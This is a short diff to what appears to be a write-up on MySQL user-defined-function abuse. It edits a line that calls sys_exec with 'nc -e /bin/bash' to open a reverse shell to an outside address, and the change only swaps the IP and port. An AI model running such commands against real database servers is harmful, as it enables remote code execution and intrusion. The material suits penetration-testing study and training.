@@ -65,5 +65,5 @@ mysql> select * from mysql.func;
 +----------+-----+------------------------+----------+
 1 row in set (0.00 sec)
 
-mysql> select sys_exec('nc -e /bin/bash 10.10.10.10 8080');
+mysql> select sys_exec('nc -e /bin/bash 192.168.1.1 80');
 ```
